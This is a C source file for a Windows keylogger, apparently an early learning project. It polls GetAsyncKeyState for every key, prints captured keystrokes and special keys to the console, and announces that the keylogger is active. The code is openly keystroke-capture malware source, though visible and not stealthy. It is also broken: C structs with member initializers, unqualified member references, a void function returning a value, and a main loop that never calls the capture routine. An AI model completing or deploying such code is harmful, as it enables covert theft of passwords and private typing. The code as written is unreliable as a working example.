#include <stdio.h>
#define _WIN32_WINNT 0x0A00
#include <windows.h>

typedef struct s_key {
	BOOL keyStates[256] = {FALSE};
	BOOL isCapsLockOn = FALSE;
 	DWORD keyPressTime[256] = {0};
	DWORD lastRepeatTime[256] = {0};

	DWORD currentTime = GetTickCount();

	DWORD repeatDelay = 0;
	DWORD repeatSpeed = 0;
	DWORD delayMs = 0;
	DWORD intervalMs = 0;
}	t_key;

void	keyPress(t_key *keyData)
{
	 for (int key = 8; key <= 255; key++)
		{
			SHORT currentState = GetAsyncKeyState(key);
			BOOL isPressed = (currentState & 0x8000) != 0;

			if (isPressed && !keyStates[key])
			{
				keyPressTime[key] = currentTime;
				lastRepeatTime[key] = currentTime;
				if (key == VK_ESCAPE)
					return 0;
				if (key == VK_RETURN)
					printf("\n");
				else if (key >= 32 && key <= 126)
				{
					if (isCapsLockOn)
						printf("%c", key);
					else
						printf("%c", key + 32);
				}
				else if (key == VK_SPACE)
					printf(" ");
				else if (key == VK_BACK)
					printf("[BACKSPACE]");
				else if (key == VK_CAPITAL)
				{
					isCapsLockOn = !isCapsLockOn;
					printf("[CAPS_LOCK]");
				}
				else if (key >= VK_F1 && key <= VK_F24)
					printf("[F%d]", key - VK_F1 + 1);
			}
			else if (isPressed && keyStates[key])
			{
				// TODO key repeat logic
				DWORD sincePressTime = currentTime - keyPressTime[key];
				DWORD sinceRepeatTime = currentTime - lastRepeatTime[key];
				if (sincePressTime >= delayMs && sinceRepeatTime >= intervalMs)
				{
					printf("key repeat LOG");
					lastRepeatTime[key] = currentTime;
				}
			}
			keyStates[key] = isPressed;
		}
		Sleep(10);
}

void	initKeylogger(t_key *keyData)
{
	
	SystemParametersInfo(SPI_GETKEYBOARDDELAY, 0, &keyData->repeatDelay, 0);
	SystemParametersInfo(SPI_GETKEYBOARDSPEED, 0, &keyData->repeatSpeed, 0);
	
	keyData->delayMs = (keyData->repeatDelay + 1) * 250;  // 250ms to 1000ms
	keyData->intervalMs = 400 - (keyData->repeatSpeed * 12); // ~400ms to ~30ms
	
	printf("Repetition delays : %ld ms\n", keyData->delayMs);
	printf("Repetition intervals : %ld ms\n", keyData->intervalMs);
	printf("Keylogger active ! Press ESC to exit\n\n");
}

int main(void)
{
	t_key keyData;
	
	initKeylogger(&keyData);
	while (1)
	{
	   
	}
}
